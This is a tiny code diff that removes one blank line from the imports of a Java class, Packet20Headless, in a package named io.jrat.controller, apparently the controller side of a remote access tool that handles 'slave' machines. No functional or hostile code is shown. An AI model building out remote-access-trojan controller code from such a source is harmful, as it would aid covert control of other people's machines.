@@ -1,7 +1,6 @@
 package io.jrat.controller.packets.incoming;
 
 import io.jrat.controller.Slave;
-
 import java.io.DataInputStream;
 
 public class Packet20Headless extends AbstractIncomingPacket {
